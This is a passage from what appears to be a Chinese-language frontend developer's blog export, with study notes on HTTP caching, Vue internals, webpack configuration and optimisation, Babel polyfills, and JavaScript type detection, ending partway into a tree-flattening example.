中添加 Last-Modified 的 header，值是这个资源在服务器上的最后修改时间，浏览器接收后缓存文件和 header；<br>当浏览器下次请求这个资源，浏览器检测到有 Last-Modified 这个 header，于是添加 If-Modified-Since 这个 header，值就是 Last-Modified 中的值；服务器再次收到这个资源请求，会根据 If-Modified-Since 中的值与服务器中这个资源的最后修改时间对比，如果没有变化，返回 304 和 空的响应体，直接从缓存中读取，如果 If-Modified-Since 的时间小于服务器中这个资源的最后修改时间，说明文件有更新，于是返回新的资源文件和 200<br>但是 Last-Modified 存在一些问题：<br>_如果本地打开缓存文件，即使没有对文件进行修改，但还是会造成 Last-Modified 被修改，服务端不能命中缓存导致发送相同的资源 _ 因为 Last-Modified 只能以秒计时，如果再不可感知的时间内完成修改文件，那么服务端会认为资源还是命中了，不会返回正确的资源*</p></li><li><p>ETag 和 If-None-Match<br>ETag 是服务器响应请求时返回当前资源的一个唯一标识（由服务器生成），只要资源有变化，ETag 就会重新生成。<br>浏览器在下一次加载资源向服务器发送请求时，会将上一次返回的 ETag 值放到 request header 里的 If-None-Match 里，服务器只需要比较客户端传来的 If-None-Match 跟自己服务器上该资源的 ETag 是否一致，就能知道资源相对于客户端是否被修改过。如果发现匹配不上，那么直接常规的 200 形式将新的资源发给客户端；如果 ETag 是一致的，则直接返回 304 只会客户端直接使用缓存即可</p><p><code>在精确度上， ETag 要优于 Last-Modified 在性能上，Last-Modified 要优于 ETag 在优先级上，服务器校验优先考虑 ETag</code></p></li></ul><h5 id="缓存位置"><a href="#缓存位置" class="headerlink" title="缓存位置"></a>缓存位置</h5><ul><li>Service Worker</li><li>Memory Cache</li><li>Disk Cache</li><li>Push Cache</li></ul><h5 id="缓存机制"><a href="#缓存机制" class="headerlink" title="缓存机制"></a>缓存机制</h5><p><strong>强制缓存优先于协商缓存进行，若强制缓存生效则直接使用缓存，若不生效则进行协商缓存，协商缓存由服务器决定是否使用缓存，若协商缓存失效，那么代表该请求的缓存失效，返回 200，重新返回资源和缓存标识，再存入浏览器缓存中；生效则返回 304，继续使用缓存</strong></p><h4 id="如何使用-beforeDestory"><a href="#如何使用-beforeDestory" class="headerlink" title="如何使用 beforeDestory"></a>如何使用 beforeDestory</h4><ul><li>解除自定义事件 event.$off</li><li>清除定时器</li><li>解除自定义 dom 事件。window.addEventListener,window.scroll 等</li></ul><h4 id="作用域插槽"><a href="#作用域插槽" class="headerlink" title="作用域插槽"></a>作用域插槽</h4><p><code>可以在父组件中获取插槽组件中的值</code></p><h4 id="vuex-中-action-和-mutation"><a href="#vuex-中-action-和-mutation" class="headerlink" title="vuex 中 action 和 mutation"></a>vuex 中 action 和 mutation</h4><ul><li>action 中可以处理异步 mutation 中不可以</li><li>mutation 做一个操作</li><li>action 可以整合多个 mutation</li></ul><h4 id="vue-页面渲染过程"><a href="#vue-页面渲染过程" class="headerlink" title="vue 页面渲染过程"></a>vue 页面渲染过程</h4><ul><li>解析模版为 render 函数</li><li>触发响应式，监听 data，get, set 属性</li><li>执行 render 函数，生成 vnode，通过 patch 函数生成页面</li></ul><p><code>这也是mvvm的体现，也是数据驱动视图的核心思想</code></p><h4 id="diff-算法"><a href="#diff-算法" class="headerlink" title="diff 算法"></a>diff 算法</h4><ul><li>vnode patch（ele,vnode）patch(vnode, newVode)</li><li>patchVode addVode removeVodes</li><li>updateChildren(key 的重要性)</li></ul><h4 id="vue-为何是异步渲染"><a href="#vue-为何是异步渲染" class="headerlink" title="vue 为何是异步渲染"></a>vue 为何是异步渲染</h4><ul><li>vue 合并 data 修改，最后一次性进行渲染，提高性能</li><li>$nextTick()会在 dom 更新完之后触发回调</li></ul><h4 id="vue-常见性能优化"><a href="#vue-常见性能优化" class="headerlink" title="vue 常见性能优化"></a>vue 常见性能优化</h4><ul><li>合理使用 v-if v-show</li><li>合理使用 computed 应为它会缓存（数据不变不会触发更新）</li><li>v-for 加 key v-for v-if 不要同时使用 v-for 优先级更改，每次 v-for v-if 会重新计，浪费性能算</li><li>自定义事件、dom 事件要及时销毁</li></ul><h4 id="vue-高阶组件中的通信"><a href="#vue-高阶组件中的通信" class="headerlink" title="vue 高阶组件中的通信"></a>vue 高阶组件中的通信</h4><ul><li><p>$attrs与$listeners</p></li><li><p>$children与$parent 属性</p></li></ul><h4 id="vue-是怎么初始化的"><a href="#vue-是怎么初始化的" class="headerlink" title="vue 是怎么初始化的"></a>vue 是怎么初始化的</h4><ul><li>1、选项合并，处理组件的配置内容，将传入的 options 与构造函数本身的 options 进行合并(用户选项和系统默认的选项进行合并)</li><li>2、初始化 vue 实例生命周期相关的属性，定义了比如：root、root、root、parent、children、children、children、refs</li><li>3、初始化自定义组件事件的监听,若存在父监听事件,则添加到该实例上</li><li>4、初始化 render 渲染所需的 slots、渲染函数等。其实就两件事：插槽的处理 和 $createElm 的声明，也就是 render 函数中的 h 的声明</li><li>5、调用 beforeCreate 钩子函数，在这里就能看出一个组件在创建前和后分别做了哪些初始化</li><li>6、初始化注入数据，隔代传参时 先 inject。作为一个组件，在要给后辈组件提供数据之前，需要先把祖辈传下来的数据注入进来</li><li>7、对 props,methods,data,computed,watch 进行初始化，包括响应式的处理</li><li>8、在把祖辈传下来的数据注入进来以后 再初始化 provide</li><li>9、调用 created 钩子函数，初始化完成，可以执行挂载了</li><li>10、挂载到对应 DOM 元素上。如果组件构造函数设置了 el 选项，会自动挂载，所以就不用再手动调用$mount 去挂载</li></ul><h3 id="vue-router"><a href="#vue-router" class="headerlink" title="vue router"></a>vue router</h3><ul><li>hash 模式</li></ul><p><code>window.onHashChange </code></p><ul><li>history</li></ul><p><code>history.pushState, window.onpopState </code></p><h3 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h3><p><code>webpack4 =&gt; wbpack5 </code></p><p><img width="600" align="center" src="/images/webpack.png" alt="ronaldoxzb" /></p></p><h4 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h4><ul><li>拆分配置和 merge common dev test production 借助 const { smart } = require(‘webpack-merge’)</li><li>启动本地服务 devServer</li><li>处理 es6 babel-loader <code>.babelrc</code>文件</li><li>处理样式 loader: [‘style-loader’, ‘css-loader’, ‘postcss-loader’, ‘less-loader’] postcss-loader 处理各浏览器样式兼容性的问题 <code>postcss.config.js</code>文件</li><li>处理图片 1 file-loader 直接引入 2 通过 url-loader 转换 base64 html 直接插入图片避免多一次请求</li><li>output filename =&gt; contentHash:8 根据文件生成 8 位 hash 文件不变直接从浏览器缓存获取不再发起请求</li></ul><p><code>loader的执行顺序：从后往前</code></p><h4 id="高级配置"><a href="#高级配置" class="headerlink" title="高级配置"></a>高级配置</h4><ul><li>多入口打包</li></ul><figure class="highlight javascript"><figcaption><span>index.html other.html为例子</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: enter :&#123; index : path.<span class="title function_">join</span>(srcPath, <span class="string">&#x27;index.js&#x27;</span>) , <span class="attr">other</span>:path.<span class="title function_">join</span>(srcPath, <span class="string">&#x27;other.js&#x27;</span>)&#125;</span><br><span class="line"><span class="number">2</span>: output : &#123; filename : <span class="string">&#x27;[name].[contentHash:8].js&#x27;</span>&#125;</span><br><span class="line"><span class="number">3</span>: 引入<span class="title function_">htmlWebpackPlugin</span>(&#123; template : path.<span class="title function_">join</span>(srcPath, inde.<span class="property">html</span>),</span><br><span class="line"><span class="attr">filename</span>: <span class="string">&#x27;index.html&#x27;</span>,</span><br><span class="line"><span class="comment">// chunks表示该页面引用哪些chunk ,只引入index.js</span></span><br><span class="line"><span class="attr">chunks</span>: [<span class="string">&#x27;index&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><ul><li>css 抽离 压缩</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">loader</span>: [<span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span>, <span class="string">&quot;css-loader&quot;</span>, <span class="string">&quot;postcss-loader&quot;</span>];</span><br><span class="line"><span class="attr">plugin</span>: [</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">MiniCssExtractPlugin</span>(&#123; <span class="attr">filename</span>: <span class="string">&quot;css/ mian.[contenthash:8].css&quot;</span> &#125;),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="attr">optimization</span>: &#123;</span><br><span class="line">  <span class="comment">// 压缩</span></span><br><span class="line">  <span class="attr">minimizer</span>: [<span class="keyword">new</span> <span class="title function_">terserJSPlugin</span>(&#123;&#125;, <span class="keyword">new</span> <span class="title class_">OptimizeCSSAssetsPlugin</span>(&#123;&#125;))];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>抽离公共代码和第三方模块</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">optimization</span>: &#123;</span><br><span class="line"> <span class="comment">// 压缩css</span></span><br><span class="line"> <span class="attr">minimizer</span>: [<span class="keyword">new</span> <span class="title function_">terserJSPlugin</span>(&#123;&#125;, <span class="keyword">new</span> <span class="title class_">OptimizeCSSAssetsPlugin</span>(&#123;&#125;))]</span><br><span class="line"> <span class="comment">// 分割代码块</span></span><br><span class="line"> <span class="attr">splitChunks</span>: &#123;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      *  initial 入口chunk，对于异步导入的文件不处理</span></span><br><span class="line"><span class="comment">      *  async 异步 chunk， 只对异步导入的问价做处理</span></span><br><span class="line"><span class="comment">      *  all 全部 chunk</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     <span class="attr">chunks</span>: <span class="string">&#x27;all&#x27;</span></span><br><span class="line">     <span class="attr">cacheGroups</span>: &#123;</span><br><span class="line">         <span class="comment">// 第三方模块</span></span><br><span class="line">         <span class="attr">vendor</span>: &#123;</span><br><span class="line">             <span class="attr">name</span>: <span class="string">&#x27;vendor&#x27;</span>, <span class="comment">// chunk名称</span></span><br><span class="line">             <span class="attr">priority</span>: <span class="number">1</span>, <span class="comment">// 权限更高，优先抽离</span></span><br><span class="line">             <span class="attr">test</span>: <span class="regexp">/node_modules/</span>,</span><br><span class="line">             <span class="attr">miniSize</span>: <span class="number">0</span>, <span class="comment">// 大小限制</span></span><br><span class="line">             <span class="attr">miniChunks</span>: <span class="number">1</span> <span class="comment">//最少复用过几次</span></span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="comment">// 公共模块</span></span><br><span class="line">         <span class="attr">common</span>: &#123;</span><br><span class="line">             <span class="attr">name</span>: <span class="string">&#x27;common&#x27;</span>, <span class="comment">// chunk名称</span></span><br><span class="line">             <span class="attr">priority</span>: <span class="number">1</span>, <span class="comment">// 权限更高，优先抽离</span></span><br><span class="line">             <span class="attr">miniSize</span>: <span class="number">0</span>, <span class="comment">// 大小限制（太小代码不用抽离，避免多次请求）</span></span><br><span class="line">             <span class="attr">miniChunks</span>: <span class="number">2</span> <span class="comment">//最少复用过几次</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>异步加载 js</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义chunk</span></span><br><span class="line"><span class="title function_">import</span>(<span class="string">&quot;.dynamic-data.js&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>处理 jsx</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`.babelrc 文件中配置`</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;presets&quot;</span> : [<span class="string">&quot;@babel/preset-env&quot;</span>],</span><br><span class="line">    <span class="string">&quot;plugin&quot;</span> : []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>处理 vue 安装 vue-loader 即可</li></ul><h4 id="module-chunk-bundle-的区别"><a href="#module-chunk-bundle-的区别" class="headerlink" title="module chunk bundle 的区别"></a>module chunk bundle 的区别</h4><ul><li>module- 各个源码文件，可以引入的，webpack 中一切皆模块</li><li>chunk- 多模块的合成， 如 entry import() splitChunk</li><li>bundle- 最终输出的文件</li></ul><h4 id="loader-plugin-的区别"><a href="#loader-plugin-的区别" class="headerlink" title="loader plugin 的区别"></a>loader plugin 的区别</h4><ul><li>loader 模块转换器 如 less =&gt; css</li><li>plugin 拓展插件 newHtmlWebpackPlugin</li></ul><h4 id="webpack-性能优化"><a href="#webpack-性能优化" class="headerlink" title="webpack 性能优化"></a>webpack 性能优化</h4><h5 id="优化构建速度"><a href="#优化构建速度" class="headerlink" title="优化构建速度"></a><code>优化构建速度</code></h5><ul><li>优化 babel-loader</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">tets</span>:<span class="regexp">/\.js$/</span>,</span><br><span class="line">    <span class="attr">use</span>:[<span class="string">&#x27;babek-loader?cacheDirectory&#x27;</span>],<span class="comment">// 开启缓存</span></span><br><span class="line">    <span class="attr">include</span>: path.<span class="title function_">resolve</span>(_dirname, <span class="string">&#x27;src&#x27;</span>) <span class="comment">// 明确范围</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>IgnorePlugin 避免引入无用模块 moment.js 为例子（不引入语言包） plugin 中开启，手动引入中文包 <code>直接不引入</code></p></li><li><p>noParse 已经打包过的库避免重复打包 vue.js 等 <code>引入但不打包</code></p></li><li><p>happyPack 多进程打包</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rules</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">tets</span>: <span class="regexp">/\.js$/</span>,</span><br><span class="line">    <span class="attr">use</span>: [<span class="string">&quot;happypack/loader?id=babel&quot;</span>], <span class="comment">// 文件处理交给id为babel的happypack实例</span></span><br><span class="line">    <span class="attr">include</span>: path.<span class="title function_">resolve</span>(_dirname, <span class="string">&quot;src&quot;</span>), <span class="comment">// 明确范围</span></span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br><span class="line"><span class="attr">plugin</span>: [</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">HappyPack</span>(&#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="string">&quot;babel&quot;</span>,</span><br><span class="line">    <span class="attr">loader</span>: [<span class="string">&quot;babek-loader?cacheDirectory&quot;</span>],</span><br><span class="line">  &#125;),</span><br><span class="line">];</span><br></pre></td></tr></table></figure><ul><li>ParallelUglifyPlugin 多进程压缩 js 和 happypack 同理</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">plugin</span>: [</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ParallelUglifyPlugin</span>(&#123;</span><br><span class="line">    <span class="attr">uglifyJS</span>: &#123;</span><br><span class="line">      <span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="attr">beautify</span>: <span class="literal">false</span>, <span class="comment">// 最紧凑输出</span></span><br><span class="line">        <span class="attr">comments</span>: <span class="literal">false</span>, <span class="comment">// 删除所有的注释</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">compress</span>: &#123;</span><br><span class="line">        <span class="attr">drop_console</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">collapse_vars</span>: <span class="literal">true</span>, <span class="comment">// 内嵌定义了但是只用到一次的变量</span></span><br><span class="line">        <span class="attr">reduce_vars</span>: <span class="literal">true</span>, <span class="comment">// 提取出出现多次但是没有定义成变量去引用的静态之</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;),</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><code>关于开启多进程看情况</code></p><ul><li>自动刷新：整个页面全部刷新，速度慢，状态丢失。 热更新则不会</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">export</span> = &#123;</span><br><span class="line">  <span class="attr">watch</span>: <span class="literal">true</span>, <span class="comment">//自动刷新</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>DLLPlugin 动态连结库插件</li></ul><h5 id="产出代码"><a href="#产出代码" class="headerlink" title="产出代码"></a><code>产出代码</code></h5><ul><li>小图片 base64 格式产出</li><li>bundle 加 hash 文件不变化 hash 不变，读缓存就可</li><li>懒加载</li><li>提取公共代码（第三方或公共代码）</li><li>IgnorePlugin 见上一部分</li><li>使用 cdn 加速</li><li>使用 production<ul><li>自动开启压缩代码（体积小，加载快）</li><li>vue react 等会自动删除调试代码（开发环境 waring 等）</li><li>自动启动 tree-sharking（ES6 module 才能让它生效， Commonjs 不生效）</li><li><code>ES6 module静态引入，编译时引用</code></li><li><code>Commonjs 动态引入，执行时引入</code></li></ul></li><li>Scope Hosting 引入插件 plugins 中配置,可 google</li></ul><h3 id="babel"><a href="#babel" class="headerlink" title="babel"></a>babel</h3><h4 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h4><ul><li>避免污染全局环境使用 babel-runtime</li></ul><h4 id="polyfill（补丁兼容）"><a href="#polyfill（补丁兼容）" class="headerlink" title="polyfill（补丁兼容）"></a>polyfill（补丁兼容）</h4><ul><li>babel-polyfill(下面两个集合，7.4 已被弃用)</li><li>core.js</li><li>regenerator</li><li>babel-polyfill 按需引入<code>.babelrc 文件中配置</code></li><li>会污染全局变量 window.Promise() Array.prototype.includes = function (){}</li></ul>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> vue </tag>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>经典题目</title>
      <link href="/2022/06/27/lesson1/"/>
      <url>/2022/06/27/lesson1/</url>
      
        <content type="html"><![CDATA[<h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><h4 id="JavaScript-是一种弱类型脚本语言，所谓弱类型指的是定义变量时，不需要什么类型，在程序运行过程中会自动判断类型。"><a href="#JavaScript-是一种弱类型脚本语言，所谓弱类型指的是定义变量时，不需要什么类型，在程序运行过程中会自动判断类型。" class="headerlink" title="JavaScript 是一种弱类型脚本语言，所谓弱类型指的是定义变量时，不需要什么类型，在程序运行过程中会自动判断类型。"></a>JavaScript 是一种弱类型脚本语言，所谓弱类型指的是定义变量时，不需要什么类型，在程序运行过程中会自动判断类型。</h4><h4 id="ECMAScript-中定义了-6-种原始类型："><a href="#ECMAScript-中定义了-6-种原始类型：" class="headerlink" title="ECMAScript 中定义了 6 种原始类型："></a>ECMAScript 中定义了 6 种原始类型：</h4><ul><li>Boolean</li><li>String</li><li>Number</li><li>Null</li><li>Undefined</li><li>Symbol（ES6 新定义）<br>注意：原始类型不包含 Object。</li><li></li></ul><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="鉴别类型通用方法"><a href="#鉴别类型通用方法" class="headerlink" title="鉴别类型通用方法"></a>鉴别类型通用方法</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">type</span>(<span class="params">target</span>) &#123; </span><br><span class="line">    <span class="keyword">const</span> ret = <span class="title function_">typeof</span>(target); </span><br><span class="line">    <span class="keyword">const</span> template = &#123; </span><br><span class="line">        <span class="string">&quot;[object Array]&quot;</span>: <span class="string">&quot;array&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;[object Object]&quot;</span>:<span class="string">&quot;object&quot;</span>, </span><br><span class="line">        <span class="string">&quot;[object Number]&quot;</span>:<span class="string">&quot;number - object&quot;</span>, </span><br><span class="line">        <span class="string">&quot;[object Boolean]&quot;</span>:<span class="string">&quot;boolean - object&quot;</span>, </span><br><span class="line">        <span class="string">&quot;[object String]&quot;</span>:<span class="string">&#x27;string-object&#x27;</span> </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(target === <span class="literal">null</span>) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;null&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(ret == <span class="string">&quot;object&quot;</span>)&#123; </span><br><span class="line">        <span class="keyword">const</span> str = <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(target); </span><br><span class="line">        <span class="keyword">return</span> template[str]; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> ret; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树型结构转一维List</title>
      <link href="/2022/05/12/tree-to-list/"/>
      <url>/2022/05/12/tree-to-list/</url>
      
        <content type="html"><![CDATA[<h3 id="树形结构转一维-list"><a href="#树形结构转一维-list" class="headerlink" title="树形结构转一维 list"></a>树形结构转一维 list</h3><h4 id="原始数据"><a href="#原始数据" class="headerlink" title="原始数据"></a>原始数据</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;a1&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a11&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a12&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;a2&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a21&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a22&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;a3&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a31&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a32&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;b1&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b11&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b12&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;b2&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b21&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b22&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;b3&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b31&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b32&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="深度优先拍平数据递归"><a href="#深度优先拍平数据递归" class="headerlink" title="深度优先拍平数据递归"></a>深度优先拍平数据<code>递归</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 